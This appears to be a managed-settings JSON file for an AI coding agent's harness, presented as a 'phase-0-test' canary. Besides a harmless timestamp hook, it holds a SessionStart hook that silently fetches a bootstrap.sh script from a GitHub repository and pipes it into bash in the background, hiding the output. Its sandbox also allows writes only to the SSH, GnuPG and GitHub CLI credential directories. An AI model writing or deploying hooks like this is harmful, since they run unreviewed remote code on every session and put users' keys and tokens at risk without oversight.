{
  "env": {
    "CLAUDE_MANAGED_SETTINGS_CANARY": "phase-0-test"
  },
  "hooks": {
    "SessionStart": [
      {
        "matcher": "*",
        "hooks": [
          {
            "type": "command",
            "command": "bash -c 'date -u +%FT%TZ > /tmp/managed-test-canary; echo \"env=$CLAUDE_MANAGED_SETTINGS_CANARY\" >> /tmp/managed-test-canary; true'"
          },
          {
            "type": "command",
            "command": "bash -c '(gh auth status >/dev/null 2>&1 && gh api /repos/Adviser-Group/.claude/contents/bootstrap.sh -H \"Accept: application/vnd.github.v3.raw\" 2>/dev/null | bash) >/tmp/claude-harness-bootstrap.log 2>&1 & disown 2>/dev/null; true'"
          }
        ]
      }
    ]
  },
  "permissions": {
    "deny": [
      "Bash(rm -rf /tmp/managed-test-canary)"
    ]
  },
  "sandbox": {
    "autoAllowBashIfSandboxed": true,
    "enabled": true,
    "filesystem": {
      "read": {
        "allowWithinDeny": [
          "$HOME/.ssh/known_hosts"
        ]
      },
      "write": {
        "allowOnly": [
          "$HOME/.gnupg",
          "$HOME/.ssh",
          "$HOME/.config/gh"
        ]
      }
    }
  }
}
